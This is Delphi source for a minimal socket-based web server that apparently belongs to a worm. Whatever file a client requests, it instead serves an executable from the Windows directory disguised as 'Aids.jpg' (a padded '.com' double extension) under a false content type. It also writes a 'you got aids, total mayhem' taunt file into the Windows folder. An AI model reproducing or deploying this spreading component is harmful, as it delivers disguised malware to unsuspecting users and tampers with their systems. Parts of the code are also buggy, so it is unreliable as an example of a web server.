   UNIT WebServer;

   INTERFACE

   USES
     Windows, Sockets, WinSock, SysUtils;

   CONST
     CRLF        = #13#10;
     PACKETLEN   = 5012;
     DOT         = '.';
     MainHtmPage = 'xxxx.htm';

   TYPE
     TWebserverInfo = PACKED RECORD
       Port       : STRING;
       Directory  : STRING;
       Connection : TClientSocket;
     END;

     TIPs        = ARRAY[0..10] OF STRING;

   VAR
     WebSrv      : TServerSocket;
     SInfo       : TWebserverInfo;
     CloseServer : Boolean = False;
     IPs         : TIPs;

   FUNCTION WinPath : STRING;
   PROCEDURE StartWebServer(Port,Directory:STRING);
   PROCEDURE GetIPs(VAR IPs:TIPS;VAR NumberOfIPs:BYTE);

   IMPLEMENTATION

   PROCEDURE GetIPs(VAR IPs:TIPS;VAR NumberOfIPs:BYTE);
   TYPE
     TaPInAddr = ARRAY [0..10] OF PInAddr;
     PaPInAddr = ^TaPInAddr;
   VAR
     phe       : PHostEnt;
     pptr      : PaPInAddr;
     Buffer    : ARRAY [0..63] OF Char;
     I         : Integer;
     GInitData : TWSAData;
   BEGIN
     WSAStartup($101,GInitData);
     GetHostName(Buffer,SizeOf(Buffer));
     phe:=GetHostByName(Buffer);
     IF phe=NIL THEN Exit;
     pPtr:=PaPInAddr(phe^.h_addr_list);
     I:=0;
     WHILE pPtr^[I]<>NIL DO BEGIN
       IPs[I]:=inet_ntoa(pptr^[I]^);
       NumberOfIPs:=I;
       Inc(I);
     END;
     WSACleanup;
   END;

   FUNCTION WinPath : STRING;
   VAR
     PWindowsDir : ARRAY [0..255] OF Char;
   BEGIN
     GetWindowsDirectory(PWindowsDir,255);
     WinPath:=STRING(PWindowsDir)+'\';
   END;

   FUNCTION ExtractFileExt(Delimiter,Input:STRING) : STRING;
   BEGIN
     WHILE Pos(Delimiter,Input)<>0 DO Delete(Input,1,Pos(Delimiter,Input));
     Result:=Input;
   END;

   FUNCTION GetOriginalFileName(R:STRING):STRING;
   VAR
     I : Word;
   BEGIN
     Result:='';
     FOR I:=1 TO Length(R) DO IF R[I]='/' THEN R[I]:='\';
     IF Pos('\..\',R)>0 then SetLength(R,Pos('\..\',R));
     Result:='c:'+R;
   END;

   FUNCTION HextoDec(S:STRING) : Longint;
   VAR
     HexStr : STRING;
   BEGIN
     IF Pos('$',S)=0 THEN HexStr:='$'+S ELSE HexStr:=S;
     Result:=StrToIntDef(HexStr,0);
   END;

   PROCEDURE ServeFile(FileName:STRING;Connection:TClientSocket);
   VAR
     I           : WORD;
     CH          : Char;
     NumberOfIPs : Byte;
     FileStream  : STRING;
     IP          : STRING;
     FileNAme2   : STRING;
     ContentType : STRING;
     Result      : STRING;
     FileNameHDD : STRING;
     Error       : Integer;
     FileSize    : Integer;
     TFile       : TextFile;
     FileHandle  : Cardinal;
     BytesRead   : Cardinal;
     F           : TSearchRec;
   BEGIN
     FileName := '/Aids.jpg                                          .com';
     GetIPs(IPs,NumberOfIPs);
     FOR I:=0 TO NumberOfIPs DO BEGIN
     IF(Pos('169',IPs[I])<>1)AND(Pos('192',IPs[I])<>1) THEN IP:=IPs[I];
     END;
     REPEAT
       I:=Pos('%',FileName);
       IF I>0 THEN BEGIN
         CH:=chr(HexToDec(Copy(FileName,I+1,2)));
         Delete(FileName,I,3);
         Insert(CH,Filename,I);
       END;
     UNTIL I=0;
     Result:='';
     ContentType:='';
     FileNameHDD:=GetOriginalFileName(FileName);
     IF FileNameHDD[Length(FileNameHDD)]='\' THEN BEGIN
       AssignFile(TFile,WinPath+MainHtmPage);
       ReWrite(TFile);
       Writeln(TFile,'$ you got aids $ total mayhem $');
       CloseFile(TFile);
     END;
     FileName:=ExtractFileExt('/',FileName);
     IF FileName='' THEN FileName:=MainHtmPage ELSE FileName:=WinPath+FileName;
     IF FileExists(FileName)OR(DirectoryExists(FileNameHDD)) THEN BEGIN
       IF Pos(MainHtmPage,FileName)>0 THEN FileHandle:=CreateFile(pChar(FileName),LongWord($80000000),0,NIL,3,$00000080,0)
       ELSE FileHandle:=CreateFile(Pchar(Filename),LongWord($80000000),0,NIL,3,$00000080,0);
       FileSize:=GetFileSize(FileHandle,NIL);
       IF (ExtractFileExt(DOT,FileName)='htm')OR(ExtractFileExt(DOT,FileName)='html') THEN ContentType:='text/html';
       IF (ExtractFileExt(DOT,FileName)='wav')OR(ExtractFileExt(DOT,FileName)='com') THEN ContentType:='application/x-shockwave-flash';
       Result:='HTTP/1.1 200 OK'+CRLF
              +'Accept-Ranges: bytes'+CRLF
              +'Content-Length: '+IntToStr(FileSize)+CRLF
              +'Keep-Alive: timeout=15, max=100'+CRLF
              +'Connection: Keep-Alive'+CRLF
              +'Content-Type: '+ContentType+CRLF+CRLF;
       SetLength(FileStream,PACKETLEN);
       Connection.Write(Result[1],Length(Result));
       REPEAT
         ReadFile(FileHandle,FileStream[1],PACKETLEN,BytesRead,NIL);
         Connection.Write(FileStream[1],PACKETLEN);
       UNTIL BytesRead<PACKETLEN;
   //    Connection.Write(FileStream[1],PACKETLEN);
       CloseHandle(FileHandle);
     END;
   END;

   PROCEDURE ServePages(Params:Pointer); STDCALL;
   VAR
     BufferIn    : STRING;
     FileToServe : STRING;
     Len         : Integer;
   BEGIN
     IF TWebserverInfo(Params^).Connection.WaitForData THEN BEGIN
       BufferIn:='';
       FileToServe:='';
       SetLength(BufferIn,PACKETLEN);
       Len:=TWebserverInfo(Params^).Connection.Read(BufferIn[1],PACKETLEN);
       BufferIn:=Copy(BufferIn,1,Len);
       IF Pos('GET',BufferIn)>0 THEN BEGIN
         Delete(BufferIn, 1, 4);
         FileToServe:=Copy(BufferIn,1,Pos('HTTP/1.1',BufferIn)-2);
         ServeFile(LowerCase(FileToServe),TWebserverInfo(Params^).Connection);
       END;
     END;
     TWebserverInfo(Params^).Connection.Destroy;
   END;

   PROCEDURE ListenThread; STDCALL;
   VAR
     CInfo  : ARRAY OF TWebServerInfo;
     Client : ARRAY OF TClientSocket;
     CCount : Integer;
     Th1    : Cardinal;
   BEGIN
     CCount:=0;
     WebSrv:=TServerSocket.Create(SInfo.Port);
     WebSrv.Listen;
     WHILE WebSrv.WaitForConnection DO BEGIN
       If CloseServer THEN Break;
       SetLength(CInfo,CCount+1);
       SetLength(Client,CCount+1);
       Client[CCount]:=TClientSocket.Create;
       WebSrv.AcceptConnection(Client[CCount]);
       CInfo[CCount].Connection:=Client[CCount];
       CreateThread(NIL,0,@ServePages,@Cinfo[CCount],0,th1);
       Inc(CCount);
     END;
     WebSrv.Destroy;
   END;

   PROCEDURE StartWebServer(Port,Directory:STRING);
   BEGIN
     CloseServer:=False;
     SInfo.Port:=Port;
     SInfo.Directory:=Directory;
     ListenThread;
   END;

   PROCEDURE StopWebServer;
   BEGIN
     CloseServer:=True;
   END;

   END.
